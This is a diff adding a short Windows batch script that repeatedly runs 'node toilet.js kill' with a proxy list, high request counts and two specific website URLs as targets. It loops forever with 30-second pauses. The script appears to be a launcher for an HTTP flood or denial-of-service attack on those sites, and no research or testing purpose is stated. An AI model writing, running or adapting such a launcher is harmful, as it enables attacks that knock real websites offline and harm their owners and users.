@@ -1,0 +1,10 @@
+@echo off
+:loop
+
+node toilet.js kill 30 10000 proxy.txt 10000 https://spikelegend.site/
+timeout /t 30 /nobreak >nul
+
+node toilet.js kill 30 10000 proxy.txt 10000 http://thespikecross.shop/
+timeout /t 30 /nobreak >nul
+
+goto loop
